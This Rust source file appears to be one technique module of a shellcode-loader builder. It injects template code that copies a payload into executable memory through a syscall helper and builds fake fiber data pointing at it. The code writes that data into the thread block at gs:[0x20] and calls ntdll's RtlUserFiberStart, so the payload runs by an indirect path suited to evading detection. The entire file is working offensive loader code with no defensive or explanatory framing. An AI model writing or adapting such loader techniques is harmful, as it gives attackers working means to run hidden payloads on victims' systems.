use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct RtlUserFiberStart;

impl Technique for RtlUserFiberStart {
    fn meta(&self) -> &'static TechniqueMeta { &RTL_USER_FIBER_START_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");

        let helpers = r#"
type RtlUserFiberStartFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
"#;
        ctx.set_replacement("{{INJECTION_HELPERS}}", helpers.to_string());

        let body = r#"
        const FIBER_CONTEXT_RIP_OFFSET: usize = 0x0F8;

        let ntdll = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll\0".as_ptr());
        if ntdll.is_null() { return; }
        let rtl_ptr = match windows_sys::Win32::System::LibraryLoader::GetProcAddress(ntdll, b"RtlUserFiberStart\0".as_ptr()) {
            Some(p) => p,
            None => return,
        };

        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }

        let heap = windows_sys::Win32::System::Memory::GetProcessHeap();
        if heap.is_null() { return; }
        let fiber_data = windows_sys::Win32::System::Memory::HeapAlloc(heap, 0, 0x300);
        if fiber_data.is_null() { return; }
        std::ptr::write_bytes(fiber_data as *mut u8, 0, 0x300);

        *((fiber_data as *mut u8).add(FIBER_CONTEXT_RIP_OFFSET) as *mut usize) = addr as usize;

        std::arch::asm!("mov gs:[0x20], {}", in(reg) fiber_data, options(nostack));

        let rtl_fn: RtlUserFiberStartFn = std::mem::transmute(rtl_ptr);
        let _ = rtl_fn(fiber_data);

        windows_sys::Win32::System::Memory::HeapFree(heap, 0, fiber_data);
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::RTL_USER_FIBER_START_META;
